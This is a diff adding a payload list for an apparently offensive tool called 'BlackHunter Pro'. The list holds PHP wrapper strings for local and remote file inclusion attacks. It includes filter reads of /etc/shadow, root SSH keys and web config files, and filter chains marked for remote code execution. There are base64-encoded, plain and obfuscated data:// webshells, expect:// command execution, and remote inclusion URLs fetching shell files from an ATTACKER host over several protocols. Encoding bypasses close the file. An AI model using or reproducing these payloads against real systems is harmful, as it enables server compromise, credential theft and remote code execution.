@@ -1,0 +1,335 @@
+# payloads/lfi/php_wrappers.txt
+# PHP Wrappers for LFI/RFI Exploitation
+# BlackHunter Pro
+
+# =============================================
+# PHP FILTER - BASE64 ENCODE
+# =============================================
+
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../index.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/convert.base64-encode/resource=../../../index.php
+php://filter/convert.base64-encode/resource=../../../config.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/shadow
+php://filter/convert.base64-encode/resource=/etc/hosts
+php://filter/convert.base64-encode/resource=/var/www/html/index.php
+php://filter/convert.base64-encode/resource=/var/www/html/config.php
+php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
+php://filter/convert.base64-encode/resource=/var/www/html/.env
+php://filter/convert.base64-encode/resource=/root/.ssh/id_rsa
+php://filter/convert.base64-encode/resource=/root/.bash_history
+php://filter/convert.base64-encode/resource=C:\Windows\win.ini
+php://filter/convert.base64-encode/resource=C:\boot.ini
+php://filter/convert.base64-encode/resource=C:\inetpub\wwwroot\web.config
+
+# =============================================
+# PHP FILTER - ROT13
+# =============================================
+
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.rot13/resource=config.php
+php://filter/read=string.rot13/resource=../index.php
+php://filter/read=string.rot13/resource=../../config.php
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/var/www/html/index.php
+
+# =============================================
+# PHP FILTER - STRING CONVERSIONS
+# =============================================
+
+php://filter/read=string.toupper/resource=index.php
+php://filter/read=string.tolower/resource=index.php
+php://filter/read=string.strip_tags/resource=index.php
+php://filter/read=string.toupper/resource=/etc/passwd
+php://filter/read=string.tolower/resource=/etc/passwd
+
+# =============================================
+# PHP FILTER - MULTIPLE FILTERS
+# =============================================
+
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=config.php
+php://filter/read=string.rot13|convert.base64-encode/resource=index.php
+php://filter/read=string.toupper|convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php
+php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16le/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16be/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-32/resource=index.php
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1252.UTF8|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2/resource=php://temp
+
+# =============================================
+# PHP FILTER - CHAIN (for RCE)
+# =============================================
+
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1252.UTF8|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2/resource=php://temp
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1252.UTF8|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1252.UTF8|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2/resource=php://temp
+php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.iconv.UTF8.UTF7|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
+
+# =============================================
+# PHP INPUT
+# =============================================
+
+php://input
+php://input?cmd=id
+php://input?cmd=whoami
+php://input?cmd=cat+/etc/passwd
+
+# =============================================
+# PHP STDIN/STDOUT/STDERR
+# =============================================
+
+php://stdin
+php://stdout
+php://stderr
+php://fd/0
+php://fd/1
+php://fd/2
+php://fd/3
+php://fd/4
+php://fd/5
+
+# =============================================
+# PHP TEMP/MEMORY
+# =============================================
+
+php://temp
+php://temp/maxmemory:1024
+php://temp/maxmemory:5242880
+php://memory
+php://memory/maxmemory:1024
+php://memory/maxmemory:5242880
+
+# =============================================
+# DATA WRAPPER - BASE64 ENCODED SHELL
+# =============================================
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKTsgPz4=
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain;base64,PD9waHAgZWNobyAiWFNTIjsgPz4=
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7ID8+
+data://text/plain;base64,PD9waHAgYXNzZXJ0KCRfUE9TVFsnYyddKTsgPz4=
+
+# =============================================
+# DATA WRAPPER - PLAIN SHELL
+# =============================================
+
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain,<?php system($_GET['c']); ?>
+data://text/plain,<?php echo file_get_contents('/etc/passwd'); ?>
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain,<?php echo "XSS"; ?>
+data://text/plain,<?php eval($_POST['c']); ?>
+data://text/plain,<?php assert($_POST['c']); ?>
+data://text/plain,<?php $a="s"."y"."s"."t"."e"."m";$a($_GET['c']); ?>
+
+# =============================================
+# DATA WRAPPER - RCE
+# =============================================
+
+data://application/x-httpd-php,<?php system('id'); ?>
+data://application/x-httpd-php,<?php system('whoami'); ?>
+data://application/x-httpd-php,<?php system('cat /etc/passwd'); ?>
+data://,<?php system('id'); ?>
+data://text/html,<script>alert(1)</script>
+data://text/javascript,alert(1)
+
+# =============================================
+# EXPECT WRAPPER - RCE
+# =============================================
+
+expect://id
+expect://whoami
+expect://ls
+expect://ls -la
+expect://cat /etc/passwd
+expect://uname -a
+expect://ifconfig
+expect://ip a
+expect://netstat -an
+expect://ps aux
+expect://env
+expect://pwd
+expect://hostname
+expect://date
+expect://w
+expect://who
+expect://last
+expect://cat /etc/shadow
+expect://cat /root/.ssh/id_rsa
+expect://find / -name "*.conf" 2>/dev/null
+
+# =============================================
+# ZIP WRAPPER
+# =============================================
+
+zip:///path/to/file.zip#shell.php
+zip:///var/www/html/upload.zip#shell.php
+zip:///tmp/upload.zip#shell.php
+zip://./file.zip#shell.php
+zip://file.zip#shell.php
+
+# =============================================
+# PHAR WRAPPER
+# =============================================
+
+phar:///path/to/file.phar/shell.php
+phar:///var/www/html/upload.phar/shell.php
+phar:///tmp/upload.phar/shell.php
+phar://./file.phar/shell.php
+phar://file.phar/shell.php
+
+# =============================================
+# COMPRESS.ZLIB WRAPPER
+# =============================================
+
+compress.zlib:///path/to/file.gz
+compress.zlib:///etc/passwd.gz
+compress.zlib:///var/www/html/index.php.gz
+compress.zlib://file.gz
+
+# =============================================
+# COMPRESS.BZIP2 WRAPPER
+# =============================================
+
+compress.bzip2:///path/to/file.bz2
+compress.bzip2:///etc/passwd.bz2
+compress.bzip2:///var/www/html/index.php.bz2
+compress.bzip2://file.bz2
+
+# =============================================
+# GLOB WRAPPER
+# =============================================
+
+glob:///etc/*
+glob:///etc/passwd*
+glob:///var/www/html/*
+glob:///var/www/html/*.php
+glob:///var/www/html/*.conf
+glob:///home/*/.ssh/id_rsa
+glob:///root/*
+
+# =============================================
+# FILE WRAPPER
+# =============================================
+
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///var/www/html/index.php
+file:///var/www/html/config.php
+file:///var/www/html/wp-config.php
+file:///root/.ssh/id_rsa
+file:///root/.bash_history
+file:///c:/windows/win.ini
+file:///c:/boot.ini
+file:///c:/inetpub/wwwroot/web.config
+
+# =============================================
+# HTTP/HTTPS WRAPPER (RFI)
+# =============================================
+
+http://ATTACKER/shell.txt
+http://ATTACKER/shell.php
+http://ATTACKER/evil.txt
+https://ATTACKER/shell.txt
+https://ATTACKER/shell.php
+http://ATTACKER/evil.txt?
+http://ATTACKER/evil.txt%00
+http://ATTACKER/evil.txt%00.php
+
+# =============================================
+# FTP WRAPPER (RFI)
+# =============================================
+
+ftp://ATTACKER/shell.txt
+ftp://user:pass@ATTACKER/shell.txt
+ftp://anonymous:anonymous@ATTACKER/shell.txt
+ftp://ATTACKER/shell.php
+
+# =============================================
+# SFTP WRAPPER (RFI)
+# =============================================
+
+sftp://ATTACKER/shell.txt
+sftp://user:pass@ATTACKER/shell.txt
+sftp://ATTACKER/shell.php
+
+# =============================================
+# SSH2 WRAPPER
+# =============================================
+
+ssh2://user:pass@ATTACKER/shell.txt
+ssh2.exec://user:pass@ATTACKER/id
+ssh2.shell://user:pass@ATTACKER/
+
+# =============================================
+# SMB WRAPPER (Windows)
+# =============================================
+
+smb://ATTACKER/share/shell.txt
+\\ATTACKER\share\shell.txt
+\\ATTACKER\share\shell.php
+
+# =============================================
+# ZLIB WRAPPER
+# =============================================
+
+zlib:///etc/passwd
+zlib:///var/www/html/index.php
+
+# =============================================
+# OGG WRAPPER
+# =============================================
+
+ogg:///path/to/file.ogg
+
+# =============================================
+# RAR WRAPPER
+# =============================================
+
+rar:///path/to/file.rar#shell.php
+
+# =============================================
+# DIRECTORY ITERATOR
+# =============================================
+
+glob:///etc/*
+glob:///var/www/html/*
+glob:///root/*
+
+# =============================================
+# BYPASS VARIANTS (for wrappers)
+# =============================================
+
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+php://filter/convert.base64-encode/resource=....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=..%2f..%2f..%2fetc/passwd
+php://filter/convert.base64-encode/resource=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+php://filter/convert.base64-encode/resource=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd%00
+php://filter/convert.base64-encode/resource=/etc/passwd%00.jpg
+
+# =============================================
+# DOUBLE URL ENCODING
+# =============================================
+
+%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%69%6E%64%65%78%2E%70%68%70
+%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46
+
+# =============================================
+# ENCODED WRAPPERS
+# =============================================
+
+php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dindex.php
+php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dconfig.php
+data%3a%2f%2ftext%2fplain%3bbase64%2cPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4%3d
+expect%3a%2f%2fid
